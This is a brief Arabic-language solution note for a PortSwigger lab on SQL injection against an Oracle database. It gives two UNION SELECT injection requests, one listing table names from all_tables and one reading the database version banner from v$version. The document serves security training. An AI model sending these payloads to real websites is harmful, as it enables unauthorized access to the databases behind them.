# Lab: SQL injection attack, querying the database type and version on Oracle

https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

- الفكره من الLab ده انك تظهر محتوي الdatabase او ممكن تختصر في اظهر الصدار الخاصه بoracle
- اهم حاجه تلاقي المكان الي هتحقن فيه الكود
- لازم توازن عدد الكولوم علشان الكود يشتغل

```bash
1. GET /filter?category=Accessories'UNION SELECT NULL, table_name FROM all_tables-- => الموجوده في الموقع  database ده هيظهر كل اسماء ال

2. GET /filter?category=Accessories' UNION SELECT NULL, banner FROM v$version-- => ده الي هيحل الاب هيظهر الاصدار
```
